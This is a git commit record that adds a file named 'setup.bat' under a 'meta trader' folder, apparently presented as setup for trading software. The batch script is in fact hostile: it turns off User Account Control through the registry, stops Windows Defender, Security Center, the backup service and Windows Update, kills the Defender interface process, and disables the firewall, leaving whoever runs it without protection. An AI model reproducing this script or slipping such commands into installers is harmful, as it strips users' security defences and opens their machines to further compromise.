98bdff609fa080fb88292909dd8a435d25e6b498
NNkjnfksl <wutersmp@gmail.com>
2024-10-26 08:30:57 -0800

    Add files via upload

---
+++ meta trader/setup.bat
@@ -0,0 +1,11 @@
+
+@Set RegistyEditCmd=Cmd /k Reg Add
+@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+net stop sharedaccess
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
